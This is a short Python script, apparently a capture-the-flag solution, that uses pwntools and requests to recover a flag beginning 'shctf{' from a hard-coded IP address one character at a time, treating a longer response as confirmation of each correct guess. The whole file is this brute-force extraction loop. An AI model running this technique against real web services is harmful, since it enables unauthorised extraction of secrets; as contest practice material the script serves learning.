from pwn import *
import requests
import string

context.log_level = 'debug'
url = 'http://172.105.154.14/?flag=shctf{'

response = requests.get(url + '\x00')  # Initial request
correct_response = len(response.text)
info('intitial response length: %d', correct_response)

# Loop until we see the flag
while '}' not in url:
    # Loop possible chars (string.printable)
    for char in '{_}' + string.ascii_lowercase + string.digits:
        response = requests.get(url + char)
        # If this is the correct char, update
        if len(response.text) > correct_response:
            correct_response = len(response.text)
            url = url + char
            info(url)
            break

# Flag plz
warn(url)
